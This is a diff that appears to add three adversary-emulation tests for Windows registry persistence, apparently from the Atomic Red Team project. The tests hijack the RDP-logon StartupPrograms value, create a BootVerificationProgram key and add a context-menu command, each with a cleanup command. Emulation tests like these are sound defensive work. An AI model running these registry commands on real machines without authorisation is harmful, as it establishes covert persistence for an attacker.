@@ -377,3 +377,54 @@ atomic_tests:
       Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
     name: powershell
     elevation_required: true
+
+- name: Allowing custom application to execute during new RDP logon session
+  auto_generated_guid: b051b3c0-66e7-4a81-916d-e6383bd3a669
+  description: |
+    When a users logs in to a computer via RDP,Windows will search for the key in HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd registry
+    By default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP
+  supported_platforms:
+  - windows
+  input_arguments:
+    malicious_app:
+      description: Application to be executed during successful RDP session
+      type: string
+      default: calc
+  executor:
+    command: |
+      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "#{malicious_app}"
+    cleanup_command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
+    name: command_prompt    
+    elevation_required: true
+    
+- name: Creating Boot Verification Program Key for application execution during successful boot
+  auto_generated_guid: 6e1666d5-3f2b-4b9a-80aa-f011322380d4
+  description: |
+    Microsoft allows users to define a custom boot verification program for those situations by creating the registry key “HKLM\System\CurrentControlSet\Control\BootVerificationProgram” and setting the value of ImagePath to the path of boot verification program.Threat Actor
+    can abuse by creating this registry key and providing a malicious application to be executed during successful boot
+  supported_platforms:
+  - windows
+  input_arguments:
+    malicious_file:
+      description: Application to be executed during successful boot
+      type: string
+      default: C:\Program Files\Internet Explorer\iexplore.exe
+  executor:
+    command: |
+      reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d "#{malicious_file}"
+    cleanup_command: reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f
+    name: command_prompt    
+    elevation_required: true
+    
+- name: Add persistence via Windows Context Menu
+  auto_generated_guid: de47f4a0-2acb-416d-9a6b-cee584a4c4d1
+  description: |
+    This atomic test add persistence taking advantage of the  Windows Context Menu [Hexacorn](https://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/)
+    User have to right click on the main screen or in the white space of the opened folder (e.g. Size Modify).
+  supported_platforms:
+  - windows
+  executor:
+    command: reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
+    cleanup_command: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
+    name: command_prompt
+    elevation_required: true
